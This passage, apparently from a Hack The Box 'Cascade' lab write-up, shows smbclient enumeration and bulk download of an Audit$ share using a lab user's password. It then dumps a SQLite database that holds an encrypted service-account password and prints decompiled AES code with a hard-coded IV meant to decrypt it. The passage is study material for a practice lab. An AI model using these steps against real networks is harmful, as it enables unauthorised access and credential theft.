</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>d-----<span class="w">        </span><span class="m">1</span>/28/2020<span class="w">   </span><span class="m">9</span>:40<span class="w"> </span>PM<span class="w">                </span>DB
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>d-----<span class="w">        </span><span class="m">1</span>/26/2020<span class="w">  </span><span class="m">10</span>:25<span class="w"> </span>PM<span class="w">                </span>x64
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>d-----<span class="w">        </span><span class="m">1</span>/26/2020<span class="w">  </span><span class="m">10</span>:25<span class="w"> </span>PM<span class="w">                </span>x86
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>-a----<span class="w">        </span><span class="m">1</span>/28/2020<span class="w">   </span><span class="m">9</span>:46<span class="w"> </span>PM<span class="w">          </span><span class="m">13312</span><span class="w"> </span>CascAudit.exe
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>-a----<span class="w">        </span><span class="m">1</span>/29/2020<span class="w">   </span><span class="m">6</span>:00<span class="w"> </span>PM<span class="w">          </span><span class="m">12288</span><span class="w"> </span>CascCrypto.dll
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>-a----<span class="w">        </span><span class="m">1</span>/28/2020<span class="w">  </span><span class="m">11</span>:29<span class="w"> </span>PM<span class="w">             </span><span class="m">45</span><span class="w"> </span>RunAudit.bat
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>-a----<span class="w">       </span><span class="m">10</span>/27/2019<span class="w">   </span><span class="m">6</span>:38<span class="w"> </span>AM<span class="w">         </span><span class="m">363520</span><span class="w"> </span>System.Data.SQLite.dll
</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>-a----<span class="w">       </span><span class="m">10</span>/27/2019<span class="w">   </span><span class="m">6</span>:38<span class="w"> </span>AM<span class="w">         </span><span class="m">186880</span><span class="w"> </span>System.Data.SQLite.EF6.dll
</span></code></pre></div></p>
<p>lets find them also through smbclient:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>cascade.htb<span class="w"> </span>-U<span class="w"> </span>s.smith%sT333ve2
</span></code></pre></div><br />
we want to download the <code>Audit$</code> share according to our previous findings<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>---------<span class="w">       </span>----<span class="w">      </span>-------
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>ADMIN$<span class="w">          </span>Disk<span class="w">      </span>Remote<span class="w"> </span>Admin
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>Audit$<span class="w">          </span>Disk<span class="w">      </span>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>C$<span class="w">              </span>Disk<span class="w">      </span>Default<span class="w"> </span>share
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>Data<span class="w">            </span>Disk<span class="w">      </span>
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>IPC$<span class="w">            </span>IPC<span class="w">       </span>Remote<span class="w"> </span>IPC
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>NETLOGON<span class="w">        </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>print$<span class="w">          </span>Disk<span class="w">      </span>Printer<span class="w"> </span>Drivers
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>SYSVOL<span class="w">          </span>Disk<span class="w">      </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span></code></pre></div></p>
<p>Downloading the whole folder on my machine:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>smbclient<span class="w"> </span><span class="s1">&#39;//cascade.htb/Audit$&#39;</span><span class="w"> </span>-N<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;prompt OFF;recurse ON;cd &#39;</span>//Casc-DC1/Audit<span class="s1">$&#39;;lcd &#39;</span>/root/HTB/cascade/smb_shares_casc-dc1/<span class="s1">&#39;;mget *&#39;</span><span class="w"> </span>-U<span class="w"> </span>s.smith%sT333ve2
</span></code></pre></div></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>tree<span class="w">                                                                                    </span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>.
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="w"> </span>CascAudit.exe
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="w"> </span>CascCrypto.dll
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="w"> </span>DB
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="w"> </span><span class="w"> </span>Audit.db
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="w"> </span>RunAudit.bat
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="w"> </span>System.Data.SQLite.dll
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="w"> </span>System.Data.SQLite.EF6.dll
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="w"> </span>x64
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a><span class="w"> </span><span class="w"> </span>SQLite.Interop.dll
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a><span class="w"> </span>x86
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="w">    </span><span class="w"> </span>SQLite.Interop.dll
</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a>
</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a><span class="m">4</span><span class="w"> </span>directories,<span class="w"> </span><span class="m">8</span><span class="w"> </span>files
</span></code></pre></div>
<h4 id="viewing-files-contained-inside-the-share">Viewing files contained inside the share</h4>
<p>the one that at first glance stands out to me obviously, is the <code>.db</code> file, lets view it:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>sqlite3<span class="w"> </span>DB/Audit.db<span class="w"> </span>.dump
</span></code></pre></div></p>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>PRAGMA<span class="w"> </span><span class="nv">foreign_keys</span><span class="o">=</span>OFF<span class="p">;</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>BEGIN<span class="w"> </span>TRANSACTION<span class="p">;</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>CREATE<span class="w"> </span>TABLE<span class="w"> </span>IF<span class="w"> </span>NOT<span class="w"> </span>EXISTS<span class="w"> </span><span class="s2">&quot;Ldap&quot;</span><span class="w"> </span><span class="o">(</span>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="w">        </span><span class="s2">&quot;Id&quot;</span><span class="w">    </span>INTEGER<span class="w"> </span>PRIMARY<span class="w"> </span>KEY<span class="w"> </span>AUTOINCREMENT,
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="w">        </span><span class="s2">&quot;uname&quot;</span><span class="w"> </span>TEXT,
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="w">        </span><span class="s2">&quot;pwd&quot;</span><span class="w">   </span>TEXT,
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="w">        </span><span class="s2">&quot;domain&quot;</span><span class="w">        </span>TEXT
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>Ldap<span class="w"> </span>VALUES<span class="o">(</span><span class="m">1</span>,<span class="s1">&#39;ArkSvc&#39;</span>,<span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span>,<span class="s1">&#39;cascade.local&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>CREATE<span class="w"> </span>TABLE<span class="w"> </span>IF<span class="w"> </span>NOT<span class="w"> </span>EXISTS<span class="w"> </span><span class="s2">&quot;Misc&quot;</span><span class="w"> </span><span class="o">(</span>
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="w">        </span><span class="s2">&quot;Id&quot;</span><span class="w">    </span>INTEGER<span class="w"> </span>PRIMARY<span class="w"> </span>KEY<span class="w"> </span>AUTOINCREMENT,
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="w">        </span><span class="s2">&quot;Ext1&quot;</span><span class="w">  </span>TEXT,
</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="w">        </span><span class="s2">&quot;Ext2&quot;</span><span class="w">  </span>TEXT
</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a>CREATE<span class="w"> </span>TABLE<span class="w"> </span>IF<span class="w"> </span>NOT<span class="w"> </span>EXISTS<span class="w"> </span><span class="s2">&quot;DeletedUserAudit&quot;</span><span class="w"> </span><span class="o">(</span>
</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="w">        </span><span class="s2">&quot;Id&quot;</span><span class="w">    </span>INTEGER<span class="w"> </span>PRIMARY<span class="w"> </span>KEY<span class="w"> </span>AUTOINCREMENT,
</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="w">        </span><span class="s2">&quot;Username&quot;</span><span class="w">      </span>TEXT,
</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a><span class="w">        </span><span class="s2">&quot;Name&quot;</span><span class="w">  </span>TEXT,
</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="w">        </span><span class="s2">&quot;DistinguishedName&quot;</span><span class="w">     </span>TEXT
</span><span id="__span-52-20"><a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-21"><a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>DeletedUserAudit<span class="w"> </span>VALUES<span class="o">(</span><span class="m">6</span>,<span class="s1">&#39;test&#39;</span>,replace<span class="o">(</span><span class="s1">&#39;Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d&#39;</span>,<span class="s1">&#39;\n&#39;</span>,char<span class="o">(</span><span class="m">10</span><span class="o">))</span>,<span class="s1">&#39;CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-22"><a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>DeletedUserAudit<span class="w"> </span>VALUES<span class="o">(</span><span class="m">7</span>,<span class="s1">&#39;deleted&#39;</span>,replace<span class="o">(</span><span class="s1">&#39;deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef&#39;</span>,<span class="s1">&#39;\n&#39;</span>,char<span class="o">(</span><span class="m">10</span><span class="o">))</span>,<span class="s1">&#39;CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-23"><a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>DeletedUserAudit<span class="w"> </span>VALUES<span class="o">(</span><span class="m">9</span>,<span class="s1">&#39;TempAdmin&#39;</span>,replace<span class="o">(</span><span class="s1">&#39;TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a&#39;</span>,<span class="s1">&#39;\n&#39;</span>,char<span class="o">(</span><span class="m">10</span><span class="o">))</span>,<span class="s1">&#39;CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-24"><a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a>DELETE<span class="w"> </span>FROM<span class="w"> </span>sqlite_sequence<span class="p">;</span>
</span><span id="__span-52-25"><a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>sqlite_sequence<span class="w"> </span>VALUES<span class="o">(</span><span class="s1">&#39;Ldap&#39;</span>,2<span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-26"><a id="__codelineno-52-26" name="__codelineno-52-26" href="#__codelineno-52-26"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>sqlite_sequence<span class="w"> </span>VALUES<span class="o">(</span><span class="s1">&#39;DeletedUserAudit&#39;</span>,10<span class="o">)</span><span class="p">;</span>
</span><span id="__span-52-27"><a id="__codelineno-52-27" name="__codelineno-52-27" href="#__codelineno-52-27"></a>COMMIT<span class="p">;</span>
</span></code></pre></div><br />
i can see a value in this line though, that seems like base64: <code>BQO5l5Kj9MdErXx6Q6AGOw==</code><br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>INSERT<span class="w"> </span>INTO<span class="w"> </span>Ldap<span class="w"> </span>VALUES<span class="o">(</span><span class="m">1</span>,<span class="s1">&#39;ArkSvc&#39;</span>,<span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span>,<span class="s1">&#39;cascade.local&#39;</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></div><br />
decoding it, provides sth unreadable/encrypted<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>D<span class="p">|</span>zC<span class="p">;</span>
</span></code></pre></div></p>
<p>I did not find anything obvious about it, so i had to check the rest of the files. The goal here is to find the source code, that will reveal the way to decrypt this encrypted text.</p>
<h4 id="debugging-the-app">Debugging the app</h4>
<p>For this matter, i downloaded jetbrains DotPeek, and opened <code>CascCrypto.dll</code>, then viewed this function:<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250702172240.png" /><br />
The source code for the DecryptString and EncryptString functions is:<br />
<div class="language-C# highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c1">// Decompiled with JetBrains decompiler</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="c1">// Type: CascCrypto.Crypto</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="c1">// Assembly: CascCrypto, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="c1">// MVID: 91D4F672-E937-4DE4-9B7F-86B055322985</span>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="k">using</span><span class="w"> </span><span class="nn">System</span><span class="p">;</span>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="k">using</span><span class="w"> </span><span class="nn">System.IO</span><span class="p">;</span>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="k">using</span><span class="w"> </span><span class="nn">System.Security.Cryptography</span><span class="p">;</span>
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="k">using</span><span class="w"> </span><span class="nn">System.Text</span><span class="p">;</span>
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="err">#</span><span class="n">nullable</span><span class="w"> </span><span class="n">disable</span>
</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a><span class="k">namespace</span><span class="w"> </span><span class="nn">CascCrypto</span><span class="p">;</span>
</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>
</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a><span class="k">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">Crypto</span>
</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a><span class="p">{</span>
</span><span id="__span-55-15"><a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a><span class="w">  </span><span class="k">public</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="n">DefaultIV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;1tdyjCbY1Ix49842&quot;</span><span class="p">;</span>
</span><span id="__span-55-16"><a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a><span class="w">  </span><span class="k">public</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">Keysize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="cm">/*0x80*/</span><span class="p">;</span>
</span><span id="__span-55-17"><a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>
</span><span id="__span-55-18"><a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a><span class="w">  </span><span class="k">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="nf">EncryptString</span><span class="p">(</span><span class="kt">string</span><span class="w"> </span><span class="n">Plaintext</span><span class="p">,</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="n">Key</span><span class="p">)</span>
</span><span id="__span-55-19"><a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a><span class="w">  </span><span class="p">{</span>
</span><span id="__span-55-20"><a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a><span class="w">    </span><span class="kt">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">Plaintext</span><span class="p">);</span>
</span><span id="__span-55-21"><a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a><span class="w">    </span><span class="n">Aes</span><span class="w"> </span><span class="n">aes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Aes</span><span class="p">.</span><span class="n">Create</span><span class="p">();</span>
</span><span id="__span-55-22"><a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="cm">/*0x80*/</span><span class="p">;</span>
</span><span id="__span-55-23"><a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="cm">/*0x80*/</span><span class="p">;</span>
</span><span id="__span-55-24"><a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&quot;1tdyjCbY1Ix49842&quot;</span><span class="p">);</span>
</span><span id="__span-55-25"><a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">Key</span><span class="p">);</span>
</span><span id="__span-55-26"><a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">Mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
</span><span id="__span-55-27"><a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a><span class="w">    </span><span class="k">using</span><span class="w"> </span><span class="p">(</span><span class="n">MemoryStream</span><span class="w"> </span><span class="n">memoryStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MemoryStream</span><span class="p">())</span>
</span><span id="__span-55-28"><a id="__codelineno-55-28" name="__codelineno-55-28" href="#__codelineno-55-28"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-55-29"><a id="__codelineno-55-29" name="__codelineno-55-29" href="#__codelineno-55-29"></a><span class="w">      </span><span class="k">using</span><span class="w"> </span><span class="p">(</span><span class="n">CryptoStream</span><span class="w"> </span><span class="n">cryptoStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CryptoStream</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span><span class="w"> </span><span class="n">memoryStream</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">(),</span><span class="w"> </span><span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Write</span><span class="p">))</span>
</span><span id="__span-55-30"><a id="__codelineno-55-30" name="__codelineno-55-30" href="#__codelineno-55-30"></a><span class="w">      </span><span class="p">{</span>
</span><span id="__span-55-31"><a id="__codelineno-55-31" name="__codelineno-55-31" href="#__codelineno-55-31"></a><span class="w">        </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
</span><span id="__span-55-32"><a id="__codelineno-55-32" name="__codelineno-55-32" href="#__codelineno-55-32"></a><span class="w">        </span><span class="n">cryptoStream</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">();</span>
</span><span id="__span-55-33"><a id="__codelineno-55-33" name="__codelineno-55-33" href="#__codelineno-55-33"></a><span class="w">      </span><span class="p">}</span>
</span><span id="__span-55-34"><a id="__codelineno-55-34" name="__codelineno-55-34" href="#__codelineno-55-34"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">());</span>
</span><span id="__span-55-35"><a id="__codelineno-55-35" name="__codelineno-55-35" href="#__codelineno-55-35"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-55-36"><a id="__codelineno-55-36" name="__codelineno-55-36" href="#__codelineno-55-36"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-55-37"><a id="__codelineno-55-37" name="__codelineno-55-37" href="#__codelineno-55-37"></a>
</span><span id="__span-55-38"><a id="__codelineno-55-38" name="__codelineno-55-38" href="#__codelineno-55-38"></a><span class="w">  </span><span class="k">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="nf">DecryptString</span><span class="p">(</span><span class="kt">string</span><span class="w"> </span><span class="n">EncryptedString</span><span class="p">,</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="n">Key</span><span class="p">)</span>
</span><span id="__span-55-39"><a id="__codelineno-55-39" name="__codelineno-55-39" href="#__codelineno-55-39"></a><span class="w">  </span><span class="p">{</span>
</span><span id="__span-55-40"><a id="__codelineno-55-40" name="__codelineno-55-40" href="#__codelineno-55-40"></a><span class="w">    </span><span class="kt">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">);</span>
</span><span id="__span-55-41"><a id="__codelineno-55-41" name="__codelineno-55-41" href="#__codelineno-55-41"></a><span class="w">    </span><span class="n">Aes</span><span class="w"> </span><span class="n">aes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Aes</span><span class="p">.</span><span class="n">Create</span><span class="p">();</span>
</span><span id="__span-55-42"><a id="__codelineno-55-42" name="__codelineno-55-42" href="#__codelineno-55-42"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="cm">/*0x80*/</span><span class="p">;</span>
</span><span id="__span-55-43"><a id="__codelineno-55-43" name="__codelineno-55-43" href="#__codelineno-55-43"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="cm">/*0x80*/</span><span class="p">;</span>
</span><span id="__span-55-44"><a id="__codelineno-55-44" name="__codelineno-55-44" href="#__codelineno-55-44"></a><span class="w">    </span><span class="n">aes</span><span class="p">.</span><span class="n">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&quot;1tdyjCbY1Ix49842&quot;</span><span class="p">);</span>
